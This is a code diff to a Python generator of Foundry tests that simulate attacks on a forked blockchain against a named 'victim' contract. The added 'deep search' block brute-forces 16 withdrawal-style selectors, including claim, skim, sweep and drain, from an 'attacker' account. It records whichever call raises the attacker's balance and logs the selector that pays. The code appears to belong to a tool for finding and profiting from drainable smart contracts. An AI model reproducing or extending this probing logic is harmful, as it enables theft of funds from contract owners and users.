@@ -357,6 +357,8 @@ contract HoneypotTestETH is Test {
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
         if (success) { _checkProfit(balBefore, "exit/leave"); vm.stopPrank(); return; }
 
+        <DEEP_SEARCH_LOGIC>
+
         require(success, "Withdraw failed (tried all variants)");
         
         vm.stopPrank();
@@ -611,7 +613,52 @@ def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_
     tw_logic = _get_timestamp_warp_logic(bug_type)
     content = content.replace("<TIMESTAMP_WARP_LOGIC>", tw_logic)
     
+    ds_logic = _get_deep_search_logic()
+    content = content.replace("<DEEP_SEARCH_LOGIC>", ds_logic)
+    
     return content
+
+def _get_deep_search_logic() -> str:
+    return """
+        // Deep Search / Last Resort
+        if (!success) {
+             bytes4[16] memory selectors = [
+                bytes4(keccak256("getReward()")),
+                bytes4(keccak256("claim()")),
+                bytes4(keccak256("claimReward()")),
+                bytes4(keccak256("distribute()")),
+                bytes4(keccak256("harvest()")),
+                bytes4(keccak256("skim(address)")),
+                bytes4(keccak256("recover()")),
+                bytes4(keccak256("refund()")),
+                bytes4(keccak256("emergencyWithdraw()")),
+                bytes4(keccak256("withdrawAll()")),
+                bytes4(keccak256("withdraw()")),
+                bytes4(keccak256("exit()")),
+                bytes4(keccak256("collect()")),
+                bytes4(keccak256("redeem()")),
+                bytes4(keccak256("sweep()")),
+                bytes4(keccak256("drain()"))
+             ];
+
+             for (uint i = 0; i < selectors.length; i++) {
+                 uint256 deepBalCheck = attacker.balance;
+                 bool s;
+                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
+                 if (!s) (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
+                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));
+
+                 if (s && attacker.balance > deepBalCheck) {
+                     _checkProfit(deepBalCheck, "deep_search");
+                     console.log("SELECTOR:");
+                     console.logBytes4(selectors[i]);
+                     success = true; // Mark as success to bypass require
+                     vm.stopPrank();
+                     return;
+                 }
+             }
+        }
+    """
 
 def run_honeypot_simulation_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, w3: Optional[Web3] = None, implementation_address: Optional[str] = None, bug_type: Optional[str] = None) -> Dict[str, Any]:
     """
